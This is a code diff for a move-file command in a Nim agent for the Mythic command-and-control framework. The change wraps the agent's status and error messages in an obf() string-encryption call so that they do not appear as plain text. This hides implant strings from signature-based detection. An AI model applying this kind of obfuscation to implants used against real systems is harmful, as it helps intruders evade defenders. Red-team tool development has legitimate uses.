@@ -1,5 +1,6 @@
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 import std/[json, os, strformat, strutils]
 
 type
@@ -16,7 +17,7 @@ proc mvFile*(taskId: string, params: string): JsonNode =
   try:
     # Check if source exists
     if not fileExists(args.source) and not dirExists(args.source):
-      return mythicError(taskId, &"Source path does not exist: {args.source}")
+      return mythicError(taskId, obf("Source path does not exist: ") & args.source)
     
     # Handle UNC paths and absolute paths for source
     let srcPath = if args.source.startsWith("\\\\") or isAbsolute(args.source):
@@ -27,7 +28,7 @@ proc mvFile*(taskId: string, params: string): JsonNode =
     let absSrcPath = if fileExists(srcPath) or dirExists(srcPath):
       normalizedPath(srcPath)
     else:
-      return mythicError(taskId, &"Source path does not exist: {srcPath}")
+      return mythicError(taskId, obf("Source path does not exist: ") & srcPath)
     
     # Handle UNC paths and absolute paths for destination
     var destPath = if args.destination.startsWith("\\\\") or isAbsolute(args.destination):
@@ -47,9 +48,9 @@ proc mvFile*(taskId: string, params: string): JsonNode =
     
     debug &"[DEBUG] Moved '{absSrcPath}' to '{normalizedDest}'"
     
-    return mythicSuccess(taskId, &"Moved '{absSrcPath}' to '{normalizedDest}'")
+    return mythicSuccess(taskId, obf("Moved '") & absSrcPath & obf("' to '") & normalizedDest & "'")
     
   except OSError as e:
-    return mythicError(taskId, &"Failed to move: {e.msg}")
+    return mythicError(taskId, obf("Failed to move: ") & e.msg)
   except Exception as e:
-    return mythicError(taskId, &"Error: {e.msg}")
+    return mythicError(taskId, obf("Error: ") & e.msg)
